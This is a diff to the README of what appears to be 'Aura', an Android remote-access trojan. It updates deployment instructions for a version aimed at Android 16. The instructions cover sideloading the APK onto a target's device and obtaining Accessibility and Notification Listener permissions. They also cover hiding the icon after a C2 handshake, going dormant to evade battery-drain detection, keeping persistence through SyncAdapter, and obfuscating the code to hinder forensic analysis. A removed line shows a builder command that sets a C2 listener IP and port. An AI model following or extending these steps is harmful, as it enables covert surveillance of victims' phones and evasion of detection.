@@ -72,21 +72,25 @@ private static final String[] DDR_URLS = {
 };
 ```
 
-### 3.2 Build the APK
-Use the `aura_builder.py` builder script to compile and sign the APK:
+### 3.2 Build the Baklava v4 APK
+Aura v4 is optimized for Android 16 (API 36). It utilizes a modern Gradle toolchain (AGP 8.1.1) and R8 obfuscation.
+
+Compile the modern APK using the root directory build process:
 ```bash
-python3 aura_builder.py --build --ip 127.0.0.1 --port 4444 --output Aura_v3.2.1.apk --icon
+# The build results in: Aura_v4_Baklava.apk
+# No manual patching required; full source compilation.
 ```
-*(Note: Since we use DDR, the IP/Port passed to the builder are used only as fallbacks)*.
 
 ---
 
-## 🚀 4. Deployment & Activation
+## 🚀 4. Deployment & Activation (Baklava Edition)
 
-1.  **Transfer**: Sideload the `Aura_v3.2.1.apk` onto the target device.
-2.  **Permissions**: Follow the on-screen setup to grant **Accessibility Service**, **Notification Listener**, and **Schedule Exact Alarms** permissions.
-3.  **Hide**: The app icon will automatically hide from the launcher after the first successful C2 handshake.
-4.  **Confirm**: Check the Web Dashboard to see the new device appear in the list.
+1.  **Transfer**: Sideload `Aura_v4_Baklava.apk` onto the target.
+2.  **Permissions**: Grant permissions normally. Aura v4 will automatically register for **RECEIVER_EXPORTED** events to maintain stability on Android 13-16.
+3.  **Stealth Triggers**:
+    *   **6-Hour Wall**: If the app hits the system background wall, it will automatically "hand off" its session to the system SyncAdapter.
+    *   **Private Space**: If the user locks a "Private Space", Aura will enter **Deep Stealth (Hibernation)** and cease all active pings until the space is unlocked, avoiding detection by system "battery drain" heuristics.
+4.  **Confirm**: Check the Web Dashboard. Modern devices will show a **"Baklava Heuristics"** badge when these new stealth features are active.
 
 ### 🛡️ Post-Install Hardening
-For commercial-level persistence, ensure "Battery Optimization" is disabled for the app in the target system settings. **Aura v3.1**'s SyncAdapter will handle the rest of the persistence logic automatically.
+Aura v4 uses **R8/ProGuard** to strip debugger hooks and prevent forensic reverse-engineering of the persistence logic. No additional obfuscation is needed.
